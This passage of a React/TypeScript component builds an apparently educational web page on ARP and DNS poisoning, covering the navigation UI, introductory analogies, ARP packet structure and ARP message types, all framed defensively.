];

// ==================== MAIN COMPONENT ====================
const ArpDnsPoisoningPage: React.FC = () => {
  const theme = useTheme();
  const navigate = useNavigate();
  const accent = ACCENT_COLOR;

  // Navigation state
  const [navDrawerOpen, setNavDrawerOpen] = useState(false);
  const [activeSection, setActiveSection] = useState<string>("");
  const isMobile = useMediaQuery(theme.breakpoints.down("md"));

  // Quiz state
  const [quizPool] = useState<QuizQuestion[]>(() =>
    selectRandomQuestions(quizQuestions, QUIZ_QUESTION_COUNT)
  );

  // Section navigation items
  const sectionNavItems = [
    { id: "intro", label: "Introduction", icon: <SchoolIcon /> },
    { id: "arp-fundamentals", label: "ARP Fundamentals", icon: <WifiIcon /> },
    { id: "arp-attacks", label: "ARP Attacks", icon: <BugReportIcon /> },
    { id: "dns-fundamentals", label: "DNS Fundamentals", icon: <DnsIcon /> },
    { id: "dns-attacks", label: "DNS Attacks", icon: <WarningIcon /> },
    { id: "ipv6-ndp", label: "IPv6 NDP Attacks", icon: <DevicesIcon /> },
    { id: "lab-setup", label: "Lab Setup", icon: <SettingsIcon /> },
    { id: "attack-scenarios", label: "Attack Scenarios", icon: <PsychologyIcon /> },
    { id: "attack-flow", label: "Attack Flow", icon: <AccountTreeIcon /> },
    { id: "detection", label: "Detection", icon: <SearchIcon /> },
    { id: "incident-response", label: "Incident Response", icon: <GavelIcon /> },
    { id: "defense", label: "Defense Controls", icon: <ShieldIcon /> },
    { id: "switch-security", label: "Switch Security", icon: <RouterIcon /> },
    { id: "dns-security", label: "DNS Security", icon: <LockIcon /> },
    { id: "tools", label: "Tools Reference", icon: <BuildIcon /> },
    { id: "commands", label: "Commands", icon: <TerminalIcon /> },
    { id: "real-incidents", label: "Real-World Incidents", icon: <HistoryIcon /> },
    { id: "best-practices", label: "Best Practices", icon: <TipsAndUpdatesIcon /> },
    { id: "quiz", label: "Knowledge Quiz", icon: <QuizIcon /> },
  ];

  // Scroll to section
  const scrollToSection = (sectionId: string) => {
    const element = document.getElementById(sectionId);
    if (element) {
      const yOffset = -80;
      const y = element.getBoundingClientRect().top + window.pageYOffset + yOffset;
      window.scrollTo({ top: y, behavior: "smooth" });
      setNavDrawerOpen(false);
    }
  };

  // Track active section on scroll
  useEffect(() => {
    const handleScroll = () => {
      const sections = sectionNavItems.map((item) => item.id);
      let currentSection = "";

      for (const sectionId of sections) {
        const element = document.getElementById(sectionId);
        if (element) {
          const rect = element.getBoundingClientRect();
          if (rect.top <= 150) {
            currentSection = sectionId;
          }
        }
      }
      setActiveSection(currentSection);
    };

    window.addEventListener("scroll", handleScroll);
    handleScroll();
    return () => window.removeEventListener("scroll", handleScroll);
  }, []);

  // Scroll to top
  const scrollToTop = () => window.scrollTo({ top: 0, behavior: "smooth" });

  // Progress calculation
  const currentIndex = sectionNavItems.findIndex((item) => item.id === activeSection);
  const progressPercent = currentIndex >= 0 ? ((currentIndex + 1) / sectionNavItems.length) * 100 : 0;

  const pageContext = `Comprehensive guide to ARP and DNS poisoning attacks covering fundamentals, attack methodologies, detection techniques, and defense strategies. Includes 75-question quiz bank, real-world case studies, and hands-on command references.`;

  // Sidebar navigation component
  const sidebarNav = (
    <Paper
      elevation={0}
      sx={{
        position: "sticky",
        top: 80,
        p: 2,
        borderRadius: 3,
        border: `1px solid ${alpha(accent, 0.15)}`,
        bgcolor: alpha(theme.palette.background.paper, 0.6),
        backdropFilter: "blur(20px)",
        maxHeight: "calc(100vh - 100px)",
        overflowY: "auto",
        "&::-webkit-scrollbar": { width: 6 },
        "&::-webkit-scrollbar-thumb": {
          background: alpha(accent, 0.3),
          borderRadius: 3,
        },
      }}
    >
      <Box sx={{ mb: 2 }}>
        <Typography variant="subtitle2" sx={{ fontWeight: 700, color: accent, display: "flex", alignItems: "center", gap: 1 }}>
          <ListAltIcon sx={{ fontSize: 18 }} />
          Course Navigation
        </Typography>
        <Box sx={{ mt: 1.5 }}>
          <Box sx={{ display: "flex", justifyContent: "space-between", mb: 0.5 }}>
            <Typography variant="caption" color="text.secondary">Progress</Typography>
            <Typography variant="caption" sx={{ fontWeight: 600, color: accent }}>{Math.round(progressPercent)}%</Typography>
          </Box>
          <LinearProgress
            variant="determinate"
            value={progressPercent}
            sx={{
              height: 6,
              borderRadius: 3,
              bgcolor: alpha(accent, 0.1),
              "& .MuiLinearProgress-bar": { bgcolor: accent, borderRadius: 3 },
            }}
          />
        </Box>
      </Box>
      <Divider sx={{ mb: 1 }} />
      <List dense sx={{ mx: -1 }}>
        {sectionNavItems.map((item) => (
          <ListItem
            key={item.id}
            onClick={() => scrollToSection(item.id)}
            sx={{
              borderRadius: 1.5,
              mb: 0.25,
              py: 0.5,
              cursor: "pointer",
              bgcolor: activeSection === item.id ? alpha(accent, 0.15) : "transparent",
              borderLeft: activeSection === item.id ? `3px solid ${accent}` : "3px solid transparent",
              "&:hover": { bgcolor: alpha(accent, 0.08) },
              transition: "all 0.15s ease",
            }}
          >
            <ListItemIcon sx={{ minWidth: 28, color: activeSection === item.id ? accent : "text.secondary" }}>
              {item.icon}
            </ListItemIcon>
            <ListItemText
              primary={
                <Typography
                  variant="caption"
                  sx={{
                    fontWeight: activeSection === item.id ? 700 : 500,
                    color: activeSection === item.id ? accent : "text.secondary",
                    fontSize: "0.75rem",
                  }}
                >
                  {item.label}
                </Typography>
              }
            />
          </ListItem>
        ))}
      </List>
    </Paper>
  );

  return (
    <LearnPageLayout pageTitle="ARP & DNS Poisoning" pageContext={pageContext}>
      {/* Floating Action Buttons */}
      <Tooltip title="Navigation" placement="left">
        <Fab
          sx={{
            position: "fixed",
            bottom: 90,
            right: 24,
            bgcolor: accent,
            "&:hover": { bgcolor: alpha(accent, 0.9) },
            zIndex: 1000,
            display: { lg: "none" },
          }}
          onClick={() => setNavDrawerOpen(true)}
        >
          <ListAltIcon />
        </Fab>
      </Tooltip>

      <Tooltip title="Scroll to Top" placement="left">
        <Fab
          size="small"
          sx={{
            position: "fixed",
            bottom: 24,
            right: 24,
            bgcolor: alpha(theme.palette.background.paper, 0.9),
            border: `1px solid ${alpha(theme.palette.divider, 0.1)}`,
            "&:hover": { bgcolor: theme.palette.background.paper },
            zIndex: 1000,
            display: { lg: "none" },
          }}
          onClick={scrollToTop}
        >
          <KeyboardArrowUpIcon />
        </Fab>
      </Tooltip>

      {/* Navigation Drawer - Mobile */}
      <Drawer
        anchor="right"
        open={navDrawerOpen}
        onClose={() => setNavDrawerOpen(false)}
        PaperProps={{
          sx: {
            width: isMobile ? "85%" : 320,
            bgcolor: theme.palette.background.paper,
            backgroundImage: "none",
          },
        }}
      >
        <Box sx={{ p: 3 }}>
          <Box sx={{ display: "flex", alignItems: "center", justifyContent: "space-between", mb: 3 }}>
            <Typography variant="h6" sx={{ fontWeight: 700 }}>Navigation</Typography>
            <IconButton size="small" onClick={() => setNavDrawerOpen(false)}>
              <CloseIcon />
            </IconButton>
          </Box>

          <Box sx={{ mb: 3 }}>
            <Box sx={{ display: "flex", justifyContent: "space-between", mb: 1 }}>
              <Typography variant="caption" sx={{ fontWeight: 600, color: "text.secondary" }}>Progress</Typography>
              <Typography variant="caption" sx={{ fontWeight: 700, color: accent }}>{Math.round(progressPercent)}%</Typography>
            </Box>
            <LinearProgress
              variant="determinate"
              value={progressPercent}
              sx={{
                height: 6,
                borderRadius: 3,
                bgcolor: alpha(accent, 0.1),
                "& .MuiLinearProgress-bar": { bgcolor: accent, borderRadius: 3 },
              }}
            />
          </Box>

          <List dense>
            {sectionNavItems.map((item) => (
              <ListItem
                key={item.id}
                onClick={() => scrollToSection(item.id)}
                sx={{
                  borderRadius: 2,
                  mb: 0.5,
                  cursor: "pointer",
                  bgcolor: activeSection === item.id ? alpha(accent, 0.15) : "transparent",
                  borderLeft: activeSection === item.id ? `3px solid ${accent}` : "3px solid transparent",
                  "&:hover": { bgcolor: alpha(accent, 0.1) },
                }}
              >
                <ListItemIcon sx={{ color: activeSection === item.id ? accent : "text.secondary", minWidth: 36 }}>
                  {item.icon}
                </ListItemIcon>
                <ListItemText
                  primary={
                    <Typography
                      variant="body2"
                      sx={{
                        fontWeight: activeSection === item.id ? 700 : 500,
                        color: activeSection === item.id ? accent : "text.primary",
                      }}
                    >
                      {item.label}
                    </Typography>
                  }
                />
              </ListItem>
            ))}
          </List>
        </Box>
      </Drawer>

      <Container maxWidth="xl" sx={{ py: 4 }}>
        <Grid container spacing={3}>
          {/* Sidebar Navigation - Desktop */}
          <Grid item lg={2.5} sx={{ display: { xs: "none", lg: "block" } }}>
            {sidebarNav}
          </Grid>

          {/* Main Content */}
          <Grid item xs={12} lg={9.5}>
            {/* Back Button */}
            <Chip
              component={Link}
              to="/learn"
              icon={<ArrowBackIcon />}
              label="Back to Learning Hub"
              clickable
              variant="outlined"
              sx={{ borderRadius: 2, mb: 3 }}
            />

            {/* Page Header */}
            <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 2 }}>
              <DnsIcon sx={{ fontSize: 48, color: accent }} />
              <Box>
                <Typography
                  variant="h3"
                  sx={{
                    fontWeight: 800,
                    background: `linear-gradient(135deg, ${accent} 0%, #38bdf8 100%)`,
                    backgroundClip: "text",
                    WebkitBackgroundClip: "text",
                    color: "transparent",
                  }}
                >
                  ARP & DNS Poisoning
                </Typography>
                <Typography variant="subtitle1" color="text.secondary">
                  Comprehensive Guide to Network Layer Attacks
                </Typography>
              </Box>
            </Box>

            <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap", mb: 4 }}>
              <Chip icon={<WifiIcon />} label="ARP Spoofing" size="small" sx={{ bgcolor: alpha(accent, 0.1) }} />
              <Chip icon={<DnsIcon />} label="DNS Poisoning" size="small" sx={{ bgcolor: alpha(accent, 0.1) }} />
              <Chip icon={<BugReportIcon />} label="MITM Attacks" size="small" sx={{ bgcolor: alpha("#ef4444", 0.1) }} />
              <Chip icon={<ShieldIcon />} label="Defense" size="small" sx={{ bgcolor: alpha("#22c55e", 0.1) }} />
              <Chip icon={<QuizIcon />} label="75 Questions" size="small" sx={{ bgcolor: alpha("#8b5cf6", 0.1) }} />
            </Box>

            {/* ==================== INTRODUCTION ==================== */}
            <Paper id="intro" sx={{ p: 4, mb: 4, borderRadius: 3, border: `1px solid ${alpha(accent, 0.1)}` }}>
              <Typography variant="h4" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <SchoolIcon sx={{ color: accent }} />
                Introduction
              </Typography>

              {/* Beginner-Friendly Analogy */}
              <Paper sx={{ p: 3, mb: 4, bgcolor: alpha(accent, 0.05), borderRadius: 2, border: `2px solid ${alpha(accent, 0.2)}` }}>
                <Typography variant="h5" sx={{ fontWeight: 700, mb: 2, color: accent }}>
                  🏠 The Neighborhood Analogy: Understanding Network Attacks
                </Typography>
                <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
                  Imagine your home network as a <strong>neighborhood</strong> where houses need to send mail to each other:
                </Typography>
                <Grid container spacing={3}>
                  <Grid item xs={12} md={6}>
                    <Paper sx={{ p: 2, bgcolor: alpha("#3b82f6", 0.05), borderRadius: 2 }}>
                      <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#3b82f6", mb: 1 }}>
                        📬 ARP = The Local Mailman
                      </Typography>
                      <Typography variant="body2" sx={{ mb: 1 }}>
                        ARP is like asking, "I need to send a package to 123 Main Street. What color is their mailbox?"
                      </Typography>
                      <Typography variant="body2" sx={{ mb: 1 }}>
                        <strong>The Problem:</strong> If someone shouts "I'm the house at 123 Main Street! My mailbox is RED!" 
                        — everyone just believes them without checking ID.
                      </Typography>
                      <Typography variant="body2" sx={{ fontStyle: "italic", color: "text.secondary" }}>
                        <strong>ARP Poisoning:</strong> An attacker pretends to be your router, so all your "mail" 
                        (internet traffic) goes through them first.
                      </Typography>
                    </Paper>
                  </Grid>
                  <Grid item xs={12} md={6}>
                    <Paper sx={{ p: 2, bgcolor: alpha("#22c55e", 0.05), borderRadius: 2 }}>
                      <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#22c55e", mb: 1 }}>
                        📖 DNS = The Internet Phone Book
                      </Typography>
                      <Typography variant="body2" sx={{ mb: 1 }}>
                        DNS is like looking up "Google's Headquarters" in a phone book to get their street address.
                      </Typography>
                      <Typography variant="body2" sx={{ mb: 1 }}>
                        <strong>The Problem:</strong> What if someone replaced the phone book page with a fake address 
                        that leads to their own building?
                      </Typography>
                      <Typography variant="body2" sx={{ fontStyle: "italic", color: "text.secondary" }}>
                        <strong>DNS Poisoning:</strong> When you try to visit google.com, you're secretly sent to 
                        a fake website that looks exactly the same.
                      </Typography>
                    </Paper>
                  </Grid>
                </Grid>
              </Paper>

              {/* Why This Matters */}
              <Paper sx={{ p: 3, mb: 4, bgcolor: alpha("#ef4444", 0.03), borderRadius: 2 }}>
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#ef4444" }}>
                  ⚠️ Why Should You Care About These Attacks?
                </Typography>
                <Grid container spacing={2}>
                  <Grid item xs={12} md={4}>
                    <Box sx={{ display: "flex", gap: 1, alignItems: "flex-start" }}>
                      <Typography sx={{ fontSize: "1.5rem" }}>💳</Typography>
                      <Box>
                        <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>Financial Theft</Typography>
                        <Typography variant="body2" color="text.secondary">
                          Attackers can steal banking credentials, credit card numbers, and cryptocurrency wallet keys 
                          by redirecting you to fake sites.
                        </Typography>
                      </Box>
                    </Box>
                  </Grid>
                  <Grid item xs={12} md={4}>
                    <Box sx={{ display: "flex", gap: 1, alignItems: "flex-start" }}>
                      <Typography sx={{ fontSize: "1.5rem" }}>🔑</Typography>
                      <Box>
                        <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>Credential Harvesting</Typography>
                        <Typography variant="body2" color="text.secondary">
                          Every password you type on a compromised network can be captured — email, social media, 
                          work accounts, everything.
                        </Typography>
                      </Box>
                    </Box>
                  </Grid>
                  <Grid item xs={12} md={4}>
                    <Box sx={{ display: "flex", gap: 1, alignItems: "flex-start" }}>
                      <Typography sx={{ fontSize: "1.5rem" }}>🏢</Typography>
                      <Box>
                        <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>Corporate Espionage</Typography>
                        <Typography variant="body2" color="text.secondary">
                          Companies have lost millions when attackers intercepted confidential communications, 
                          contracts, and intellectual property.
                        </Typography>
                      </Box>
                    </Box>
                  </Grid>
                </Grid>
              </Paper>

              <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
                ARP (Address Resolution Protocol) and DNS (Domain Name System) poisoning are fundamental network-layer attacks
                that exploit trust-based protocols designed before security was a primary concern. These attacks enable
                man-in-the-middle (MITM) positions, credential theft, session hijacking, and traffic manipulation.
              </Typography>

              <Alert severity="info" sx={{ mb: 3 }}>
                <AlertTitle>Educational Context</AlertTitle>
                This guide covers attack techniques from a defensive perspective. Understanding how attacks work is essential
                for building effective defenses. Always practice in isolated lab environments with proper authorization.
              </Alert>

              {/* Quick Facts */}
              <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#8b5cf6", 0.03), borderRadius: 2 }}>
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#8b5cf6" }}>
                  📊 Quick Facts for Beginners
                </Typography>
                <Grid container spacing={2}>
                  {[
                    { label: "ARP Attack Range", value: "Local Network Only", desc: "Attacker must be on same WiFi/LAN" },
                    { label: "DNS Attack Range", value: "Local to Global", desc: "Can affect one PC or millions" },
                    { label: "Detection Difficulty", value: "Moderate", desc: "Often invisible to regular users" },
                    { label: "Defense Complexity", value: "Medium", desc: "Requires network infrastructure changes" },
                    { label: "Risk on Public WiFi", value: "Very High", desc: "Coffee shops, airports are hotspots" },
                    { label: "HTTPS Protection", value: "Partial", desc: "Helps but not foolproof" },
                  ].map((item, idx) => (
                    <Grid item xs={6} md={4} key={idx}>
                      <Box sx={{ textAlign: "center", p: 1 }}>
                        <Typography variant="h6" sx={{ fontWeight: 700, color: accent }}>{item.value}</Typography>
                        <Typography variant="subtitle2" sx={{ fontWeight: 600 }}>{item.label}</Typography>
                        <Typography variant="caption" color="text.secondary">{item.desc}</Typography>
                      </Box>
                    </Grid>
                  ))}
                </Grid>
              </Paper>

              <Grid container spacing={3}>
                <Grid item xs={12} md={6}>
                  <Paper sx={{ p: 3, bgcolor: alpha(accent, 0.05), borderRadius: 2, height: "100%" }}>
                    <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: accent }}>
                      ARP Poisoning Overview
                    </Typography>
                    <Typography variant="body2" sx={{ mb: 2, color: "text.secondary" }}>
                      ARP poisoning manipulates the IP-to-MAC address mappings in a local network's ARP cache.
                      By sending false ARP replies, an attacker can redirect traffic through their machine.
                    </Typography>
                    <List dense>
                      <ListItem><ListItemText primary="• Operates at Layer 2 (Data Link)" /></ListItem>
                      <ListItem><ListItemText primary="• Requires local network access" /></ListItem>
                      <ListItem><ListItemText primary="• Enables traffic interception" /></ListItem>
                      <ListItem><ListItemText primary="• Foundation for other attacks" /></ListItem>
                    </List>
                  </Paper>
                </Grid>
                <Grid item xs={12} md={6}>
                  <Paper sx={{ p: 3, bgcolor: alpha("#22c55e", 0.05), borderRadius: 2, height: "100%" }}>
                    <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#22c55e" }}>
                      DNS Poisoning Overview
                    </Typography>
                    <Typography variant="body2" sx={{ mb: 2, color: "text.secondary" }}>
                      DNS poisoning corrupts the domain name resolution process, redirecting users to malicious
                      servers when they attempt to visit legitimate websites.
                    </Typography>
                    <List dense>
                      <ListItem><ListItemText primary="• Operates at Layer 7 (Application)" /></ListItem>
                      <ListItem><ListItemText primary="• Can work locally or remotely" /></ListItem>
                      <ListItem><ListItemText primary="• Redirects users to fake sites" /></ListItem>
                      <ListItem><ListItemText primary="• Used in phishing campaigns" /></ListItem>
                    </List>
                  </Paper>
                </Grid>
              </Grid>

              <Box sx={{ mt: 3 }}>
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Learning Objectives</Typography>
                <Grid container spacing={2}>
                  {[
                    "Understand ARP and DNS protocol fundamentals",
                    "Recognize attack indicators and warning signs",
                    "Implement effective detection mechanisms",
                    "Deploy defense-in-depth strategies",
                    "Configure switch-level security features",
                    "Apply DNS security best practices"
                  ].map((obj, idx) => (
                    <Grid item xs={12} sm={6} key={idx}>
                      <Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                        <CheckCircleIcon sx={{ color: "#22c55e", fontSize: 20 }} />
                        <Typography variant="body2">{obj}</Typography>
                      </Box>
                    </Grid>
                  ))}
                </Grid>
              </Box>
            </Paper>

            {/* ==================== ARP FUNDAMENTALS ==================== */}
            <Paper id="arp-fundamentals" sx={{ p: 4, mb: 4, borderRadius: 3, border: `1px solid ${alpha(accent, 0.1)}` }}>
              <Typography variant="h4" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <WifiIcon sx={{ color: accent }} />
                ARP Fundamentals
              </Typography>

              {/* Beginner Analogy */}
              <Paper sx={{ p: 3, mb: 4, bgcolor: alpha(accent, 0.05), borderRadius: 2, border: `2px solid ${alpha(accent, 0.2)}` }}>
                <Typography variant="h5" sx={{ fontWeight: 700, mb: 2, color: accent }}>
                  🏷️ The Name Tag Analogy
                </Typography>
                <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
                  Imagine you're at a <strong>masquerade party</strong> where everyone wears masks:
                </Typography>
                <Grid container spacing={2}>
                  <Grid item xs={12} md={4}>
                    <Box sx={{ textAlign: "center", p: 2 }}>
                      <Typography sx={{ fontSize: "2.5rem", mb: 1 }}>🎭</Typography>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>IP Address = Your Name</Typography>
                      <Typography variant="body2" color="text.secondary">
                        "Hi, I'm John Smith" — This is how you're known to everyone at the party.
                      </Typography>
                    </Box>
                  </Grid>
                  <Grid item xs={12} md={4}>
                    <Box sx={{ textAlign: "center", p: 2 }}>
                      <Typography sx={{ fontSize: "2.5rem", mb: 1 }}>👤</Typography>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>MAC Address = Your Face</Typography>
                      <Typography variant="body2" color="text.secondary">
                        Your physical appearance — unique to you and needed to actually hand you a drink.
                      </Typography>
                    </Box>
                  </Grid>
                  <Grid item xs={12} md={4}>
                    <Box sx={{ textAlign: "center", p: 2 }}>
                      <Typography sx={{ fontSize: "2.5rem", mb: 1 }}>📢</Typography>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>ARP = Shouting a Question</Typography>
                      <Typography variant="body2" color="text.secondary">
                        "Hey John Smith, raise your hand so I can see what you look like!"
                      </Typography>
                    </Box>
                  </Grid>
                </Grid>
                <Alert severity="warning" sx={{ mt: 2 }}>
                  <Typography variant="body2">
                    <strong>The Security Problem:</strong> Anyone at the party can raise their hand and say "I'm John Smith!" 
                    There's no bouncer checking IDs. That's exactly how ARP poisoning works.
                  </Typography>
                </Alert>
              </Paper>

              {/* Technical Deep Dive */}
              <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
                The Address Resolution Protocol (ARP) is a Layer 2/3 protocol that maps IP addresses to MAC (Media Access Control)
                addresses on local area networks. When a device needs to send a packet to another device on the same network,
                it must know the destination's MAC address to create the Ethernet frame.
              </Typography>

              {/* What is a MAC Address */}
              <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#8b5cf6", 0.03), borderRadius: 2 }}>
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#8b5cf6" }}>
                  🔢 Understanding MAC Addresses
                </Typography>
                <Grid container spacing={3}>
                  <Grid item xs={12} md={6}>
                    <Typography variant="body2" sx={{ mb: 2 }}>
                      A <strong>MAC address</strong> (Media Access Control) is a unique hardware identifier assigned to every network interface card (NIC).
                    </Typography>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Example MAC Address:</Typography>
                    <Box sx={{ fontFamily: "monospace", fontSize: "1.1rem", bgcolor: alpha("#000", 0.05), p: 1, borderRadius: 1, mb: 2 }}>
                      <Typography component="span" sx={{ color: "#ef4444", fontWeight: 700 }}>AA:BB:CC</Typography>
                      <Typography component="span">:</Typography>
                      <Typography component="span" sx={{ color: "#3b82f6", fontWeight: 700 }}>DD:EE:FF</Typography>
                    </Box>
                    <Typography variant="body2">
                      <Typography component="span" sx={{ color: "#ef4444", fontWeight: 700 }}>First 3 bytes (OUI):</Typography> Identifies the manufacturer (Intel, Cisco, etc.)
                    </Typography>
                    <Typography variant="body2">
                      <Typography component="span" sx={{ color: "#3b82f6", fontWeight: 700 }}>Last 3 bytes:</Typography> Unique device identifier
                    </Typography>
                  </Grid>
                  <Grid item xs={12} md={6}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Why Do We Need Both IP and MAC?</Typography>
                    <TableContainer component={Paper} sx={{ bgcolor: "transparent" }}>
                      <Table size="small">
                        <TableBody>
                          <TableRow>
                            <TableCell sx={{ fontWeight: 700 }}>IP Address</TableCell>
                            <TableCell>Logical address, can change</TableCell>
                            <TableCell>Used for routing across networks</TableCell>
                          </TableRow>
                          <TableRow>
                            <TableCell sx={{ fontWeight: 700 }}>MAC Address</TableCell>
                            <TableCell>Physical address, permanent*</TableCell>
                            <TableCell>Used for local delivery</TableCell>
                          </TableRow>
                        </TableBody>
                      </Table>
                    </TableContainer>
                    <Typography variant="caption" color="text.secondary" sx={{ mt: 1, display: "block" }}>
                      *MAC addresses can be spoofed in software, but the hardware address is burned in at the factory.
                    </Typography>
                  </Grid>
                </Grid>
              </Paper>

              <Grid container spacing={3}>
                <Grid item xs={12} md={6}>
                  <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>How ARP Works (Step by Step)</Typography>
                  <List>
                    <ListItem>
                      <ListItemIcon><Typography sx={{ fontWeight: 700, color: accent }}>1</Typography></ListItemIcon>
                      <ListItemText
                        primary="Device A wants to communicate with Device B"
                        secondary="A knows B's IP (192.168.1.5) but not its MAC address"
                      />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><Typography sx={{ fontWeight: 700, color: accent }}>2</Typography></ListItemIcon>
                      <ListItemText
                        primary="A broadcasts an ARP Request to everyone"
                        secondary="'Who has 192.168.1.5? Tell 192.168.1.1' — sent to FF:FF:FF:FF:FF:FF"
                      />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><Typography sx={{ fontWeight: 700, color: accent }}>3</Typography></ListItemIcon>
                      <ListItemText
                        primary="All devices receive the broadcast"
                        secondary="Everyone hears it, but only the device with that IP responds"
                      />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><Typography sx={{ fontWeight: 700, color: accent }}>4</Typography></ListItemIcon>
                      <ListItemText
                        primary="B sends a unicast ARP Reply directly to A"
                        secondary="'192.168.1.5 is at AA:BB:CC:DD:EE:FF' — only A receives this"
                      />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><Typography sx={{ fontWeight: 700, color: accent }}>5</Typography></ListItemIcon>
                      <ListItemText
                        primary="A caches the mapping in its ARP table"
                        secondary="Future packets use the cached MAC — no need to ask again (for a while)"
                      />
                    </ListItem>
                  </List>
                </Grid>
                <Grid item xs={12} md={6}>
                  <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>ARP Packet Structure</Typography>
                  <TableContainer component={Paper} sx={{ bgcolor: alpha(accent, 0.02) }}>
                    <Table size="small">
                      <TableHead>
                        <TableRow>
                          <TableCell sx={{ fontWeight: 700 }}>Field</TableCell>
                          <TableCell sx={{ fontWeight: 700 }}>Size</TableCell>
                          <TableCell sx={{ fontWeight: 700 }}>Purpose</TableCell>
                        </TableRow>
                      </TableHead>
                      <TableBody>
                        <TableRow><TableCell>Hardware Type</TableCell><TableCell>2 bytes</TableCell><TableCell>Network type (1 = Ethernet)</TableCell></TableRow>
                        <TableRow><TableCell>Protocol Type</TableCell><TableCell>2 bytes</TableCell><TableCell>Protocol (0x0800 = IPv4)</TableCell></TableRow>
                        <TableRow><TableCell>Operation</TableCell><TableCell>2 bytes</TableCell><TableCell>1 = Request, 2 = Reply</TableCell></TableRow>
                        <TableRow><TableCell>Sender MAC</TableCell><TableCell>6 bytes</TableCell><TableCell>Source hardware address</TableCell></TableRow>
                        <TableRow><TableCell>Sender IP</TableCell><TableCell>4 bytes</TableCell><TableCell>Source protocol address</TableCell></TableRow>
                        <TableRow><TableCell>Target MAC</TableCell><TableCell>6 bytes</TableCell><TableCell>Destination hardware addr</TableCell></TableRow>
                        <TableRow><TableCell>Target IP</TableCell><TableCell>4 bytes</TableCell><TableCell>Destination protocol addr</TableCell></TableRow>
                      </TableBody>
                    </Table>
                  </TableContainer>
                </Grid>
              </Grid>

              {/* ARP Types Explained */}
              <Box sx={{ mt: 4 }}>
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Types of ARP Messages</Typography>
                <Grid container spacing={2}>
                  <Grid item xs={12} md={6}>
                    <Paper sx={{ p: 2, bgcolor: alpha("#3b82f6", 0.05), borderRadius: 2, height: "100%" }}>
                      <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#3b82f6", mb: 1 }}>ARP Request</Typography>
                      <Typography variant="body2" sx={{ mb: 1 }}>
                        Broadcast message asking "Who has this IP? Tell me your MAC."
                      </Typography>
                      <Typography variant="caption" sx={{ fontFamily: "monospace", bgcolor: alpha("#000", 0.05), p: 0.5, borderRadius: 1, display: "block" }}>
                        Who has 192.168.1.1? Tell 192.168.1.100
                      </Typography>
                    </Paper>
                  </Grid>
                  <Grid item xs={12} md={6}>
                    <Paper sx={{ p: 2, bgcolor: alpha("#22c55e", 0.05), borderRadius: 2, height: "100%" }}>
                      <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#22c55e", mb: 1 }}>ARP Reply</Typography>
                      <Typography variant="body2" sx={{ mb: 1 }}>
                        Unicast response saying "I have that IP, here's my MAC address."
                      </Typography>
                      <Typography variant="caption" sx={{ fontFamily: "monospace", bgcolor: alpha("#000", 0.05), p: 0.5, borderRadius: 1, display: "block" }}>
                        192.168.1.1 is at aa:bb:cc:dd:ee:ff
                      </Typography>
                    </Paper>
                  </Grid>
                  <Grid item xs={12} md={6}>
                    <Paper sx={{ p: 2, bgcolor: alpha("#f59e0b", 0.05), borderRadius: 2, height: "100%" }}>
                      <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#f59e0b", mb: 1 }}>Gratuitous ARP</Typography>
                      <Typography variant="body2" sx={{ mb: 1 }}>
                        Unsolicited announcement: "Hey everyone, THIS is my IP and MAC!" 
                        Used legitimately for IP conflict detection and failover.
                      </Typography>
                      <Typography variant="caption" color="error">
                        ⚠️ Often abused in attacks since it's accepted without being requested
                      </Typography>
                    </Paper>
                  </Grid>
                  <Grid item xs={12} md={6}>
                    <Paper sx={{ p: 2, bgcolor: alpha("#8b5cf6", 0.05), borderRadius: 2, height: "100%" }}>
                      <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#8b5cf6", mb: 1 }}>ARP Probe</Typography>
                      <Typography variant="body2" sx={{ mb: 1 }}>
                        Sent during DHCP to check if an IP is already in use before claiming it. 
                        Sender IP is set to 0.0.0.0.
                      </Typography>
                      <Typography variant="caption" color="text.secondary">
                        Used in address auto-configuration (APIPA)
                      </Typography>
                    </Paper>
                  </Grid>
                </Grid>
              </Box>

              <Box sx={{ mt: 3 }}>
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>ARP Cache Behavior by Operating System</Typography>
                <Grid container spacing={2}>
                  <Grid item xs={12} md={4}>
                    <Paper sx={{ p: 2, bgcolor: alpha("#3b82f6", 0.05), borderRadius: 2 }}>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#3b82f6" }}>Windows</Typography>
